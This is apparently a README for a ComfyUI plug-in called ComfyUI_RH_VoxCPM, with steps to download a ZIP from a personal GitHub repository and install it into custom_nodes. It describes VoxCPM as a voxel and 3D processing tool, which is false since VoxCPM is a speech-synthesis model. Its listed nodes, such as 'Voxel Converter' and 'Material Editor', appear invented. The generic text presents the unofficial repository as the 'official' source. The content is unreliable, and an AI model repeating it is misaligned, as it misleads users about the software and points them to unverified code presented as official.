# 📦 ComfyUI_RH_VoxCPM - Use VoxCPM Within ComfyUI Workflow Easily

[![](https://img.shields.io/badge/Download-Visit_Repository-blue.svg)](https://github.com/youkatalo123-star/ComfyUI_RH_VoxCPM)

ComfyUI_RH_VoxCPM acts as a bridge for your ComfyUI workspace. This plug-in adds tools from VoxCPM to your node-based workflow. It allows you to process 3D data and voxel models directly inside your existing ComfyUI setup. You do not need to switch between different applications to handle your creative projects.

## ⚙️ System Requirements

Ensure your computer meets these standards before you begin:

*   Operating System: Windows 10 or Windows 11.
*   Graphics Card: NVIDIA GPU with at least 8GB of video memory.
*   Software: ComfyUI must be installed and running on your machine.
*   Drivers: Update your NVIDIA graphics card drivers to the latest version.
*   Disk Space: Allocate 2GB of storage for the model files and the plug-in components.

## 📥 Getting the Software

You must obtain the plug-in files from the official repository. Perform these steps:

1. Visit [this link](https://github.com/youkatalo123-star/ComfyUI_RH_VoxCPM) to reach the main page.
2. Look for the green button labeled Code.
3. Select Download ZIP from the dropdown menu.
4. Save the file to your computer.
5. Create a new folder on your desktop for these files.
6. Extract the contents of the ZIP file into this folder.

## 🛠️ Installing the Plug-in

Follow these instructions to move the plug-in into your ComfyUI directory:

1. Open your ComfyUI installation folder.
2. Navigate to the folder named custom_nodes.
3. Open the folder you extracted in the previous section.
4. Copy the entire ComfyUI_RH_VoxCPM folder.
5. Paste this folder inside your custom_nodes location.
6. Restart ComfyUI if it is currently open. 
7. Refresh your web browser to load the new nodes.

## 🚀 Running Your First Project

Once you install the plug-in, the new nodes appear in your workspace. Use these steps to test the connection:

1. Right-click anywhere in the empty ComfyUI workspace.
2. Select Add Node from the menu.
3. Look for the category labeled VoxCPM.
4. Click on a node to place it on the screen.
5. Connect your existing nodes to the inputs of the VoxCPM node.
6. Verify that the node shows no error messages.
7. Click Queue Prompt to start the processing.

## 💡 Using VoxCPM Nodes

The plug-in provides several specialized nodes for your workflow. Here are the common functions:

VoxCPM Loader: This node initializes the model parameters. Place this at the start of your chain to ensure the data loads correctly.

Voxel Converter: Use this node to transform standard images into voxel data. Adjust the density and scale sliders to modify the output.

Renderer: This node converts your voxel data back into a visual format. It provides controls for lighting, shadow, and depth of field.

Material Editor: This node allows you to apply textures and colors to your voxel results. Use the provided inputs to link your color maps to the finished structure.

## 🔧 Troubleshooting Common Issues

If you encounter difficulties, review these common fixes:

*   Nodes appear gray: This indicates that ComfyUI cannot find the necessary files. Check that the folder structure inside custom_nodes is correct.
*   Memory errors: Voxel processing requires significant VRAM. Close other programs such as web browsers or video players to free up memory before you run the workflow.
*   Missing dependencies: Some features require extra data sets. Ensure your internet connection is active during the first run so the application can download required files.
*   Update issues: If the nodes stop working after a ComfyUI update, return to the repository link and fetch the latest version of the plug-in. Replace your existing folder with the new version.
*   Slow performance: Large voxel grids take longer to render. Reduce the resolution settings in the Voxel Converter node to speed up the process.

## 📄 License and Use

This plug-in remains open for personal and creative projects. You retain control over the content you generate. Keep your local installation updated to benefit from future improvements and stability fixes. Reach out to the repository maintainers if you identify bugs or need technical clarification. The software relies on community feedback to improve.